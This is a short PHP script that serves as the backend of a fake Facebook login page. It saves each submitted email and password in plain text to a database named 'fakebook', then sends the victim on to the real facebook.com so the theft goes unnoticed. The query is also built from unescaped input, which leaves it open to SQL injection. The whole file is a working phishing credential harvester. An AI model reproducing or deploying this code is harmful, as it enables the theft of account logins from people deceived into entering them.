<?php
$email = $_POST['email'];
$password = $_POST['password'];
$con = mysqli_connect('localhost', 'root','','fakebook');
mysqli_query($con,"INSERT INTO `fbusers` (`email`, `password`) VALUES ( '$email', '$password')");
header("Location: https://facebook.com/");
mysql_close($con)
?>?

 